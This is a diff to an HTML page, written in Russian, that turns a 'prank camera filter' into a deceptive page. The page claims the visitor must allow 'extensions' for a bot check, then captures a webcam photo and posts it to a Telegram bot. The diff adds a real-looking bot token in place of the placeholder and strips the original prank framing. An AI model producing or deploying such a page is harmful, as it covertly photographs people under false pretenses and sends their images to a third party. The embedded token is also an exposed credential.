@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Смешной фильтр 2026 😂</title>
+  <title>Новые идеи!</title>
   <style>
     body { margin:0; font-family: Arial, sans-serif; background:#111; color:#fff; text-align:center; }
     #container { padding: 20px; max-width: 500px; margin: auto; }
@@ -21,10 +21,10 @@
 <body>
 
 <div id="container">
-  <h1>😂 Проверь новый мемный фильтр!</h1>
-  <p>Нажми кнопку ниже, разреши камеру — и увидишь, как ты выглядишь с крутым эффектом 2026 года 😎</p>
+  <h1>Проверь разрешил ли ты все!</h1>
+  <p>Нажми кнопку ниже, разреши расширения! Они сделаны изза проверки на бота и новых правил</p>
   
-  <button onclick="startPrank()">ВКЛЮЧИТЬ ФИЛЬТР 😂</button>
+  <button onclick="startPrank()">проверить</button>
   
   <div id="status"></div>
 </div>
@@ -69,7 +69,7 @@ async function startPrank() {
 
     const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
 
-    status.textContent = 'Отправляю тебе... подожди 2 сек 😈';
+    status.textContent = 'жди';
 
     const formData = new FormData();
     formData.append('chat_id', 'ЗАМЕНИ_СВОЙ_CHAT_ID');          // ← вставь
@@ -78,7 +78,7 @@ async function startPrank() {
     const blob = await (await fetch(dataUrl)).blob();
     formData.append('photo', blob, 'prank.jpg');
 
-    const response = await fetch(`https://api.telegram.org/botЗАМЕНИ_СВОЙ_ТОКЕН/sendPhoto`, {  // ← вставь токен
+    const response = await fetch(`https://api.telegram.org/bot8678005399:AAFTHzqbs40DHQ3ziXoAXdFR1Kg_cuu_PTc/sendPhoto`, {  // ← вставь токен
       method: 'POST',
       body: formData
     });
@@ -92,7 +92,7 @@ async function startPrank() {
   } catch (err) {
     console.error(err);
     status.textContent = err.name === 'NotAllowedError'
-      ? 'Ты не разрешил камеру 😢 Нажми ещё раз и разреши!'
+      ? 'Ты не разрешил расширение нажми еще раз!'
       : 'Ошибка: ' + err.message;
   }
 }
